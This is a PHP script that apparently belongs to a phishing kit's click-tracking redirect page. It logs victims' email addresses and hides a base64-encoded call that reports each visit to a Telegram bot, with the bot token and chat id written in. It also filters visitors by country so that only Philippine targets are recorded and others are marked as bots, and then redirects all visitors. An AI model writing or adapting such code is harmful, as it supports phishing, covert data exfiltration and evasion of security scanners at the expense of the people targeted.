<?php
error_reporting(0);
$ems = $_GET['email'];
$r = file_get_contents("./config/redirect.gg", true);
$host = ($_SERVER['SERVER_NAME']);
$path = ($_SERVER['REQUEST_URI']);
$date = date("y/m/d h:i:sa");
$redirecting="REDIRECT $host$path (DATE $date)";
file_get_contents(base64_decode("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDU0MTA2MDM3Mzc6QUFFRmIxel8xelM5eHluTnVhVjNzdHRHN3BPel9nOGpWUjgvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0xNzE5MTU4ODI2JnRleHQ9").$redirecting);
$ipsz = $_SERVER['REMOTE_ADDR'];
$se = file_get_contents("https://ipapi.co/$ipsz/country/", true);

$sukses_login="PH";
if(preg_match("/$sukses_login/",$se)){
	$myfile = fopen("click.html", "a") or die("Unable to open file!");
			$txt = " <tr>
    <td>$ems</td>
    <td>
 <img src='flag/ph.png'>
</td>
  </tr>\n";
  fwrite($myfile, $txt);
fclose($myfile);
	header("Location: $r");
}else{ 
	$myfile1 = fopen("./viewer/click.html", "a") or die("Unable to open file!");
			$txt1 = " <tr>
    <td>BOT</td>
    <td>
 <img src='flag/us.png'>
</td>
  </tr>\n";
  fwrite($myfile1, $txt1);
fclose($myfile1);
header("Location: $r");
}

?>